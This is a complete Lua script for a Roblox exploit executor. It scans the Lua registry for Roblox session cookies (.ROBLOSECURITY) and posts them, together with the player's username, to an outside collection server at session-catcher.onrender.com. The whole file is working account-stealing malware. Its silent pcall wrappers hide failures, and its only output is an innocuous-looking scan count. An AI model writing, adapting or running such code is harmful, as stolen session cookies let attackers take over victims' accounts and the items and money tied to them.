local SERVER_URL = "https://session-catcher.onrender.com/catch"
local httpRequest = request or http_request or nil
if not httpRequest then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local foundCookies = {}
local scanned = 0

pcall(function()
    if getreg then
        local reg = getreg()
        for i, v in pairs(reg) do
            scanned = scanned + 1
            if type(v) == "string" then
                if string.find(v, "_|WARNING") or string.find(v, "ROBLOSECURITY") then
                    table.insert(foundCookies, v)
                end
            elseif type(v) == "table" then
                for k2, v2 in pairs(v) do
                    scanned = scanned + 1
                    if type(v2) == "string" then
                        if string.find(v2, "_|WARNING") or string.find(v2, "ROBLOSECURITY") then
                            table.insert(foundCookies, v2)
                        end
                    end
                end
            end
        end
    end
end)

local payload = {
    username = LocalPlayer.Name,
    scanned = scanned,
    foundCookies = foundCookies
}

pcall(function()
    httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)

print("[Catcher] getreg scan done. Scanned: " .. scanned .. " | Found: " .. #foundCookies)
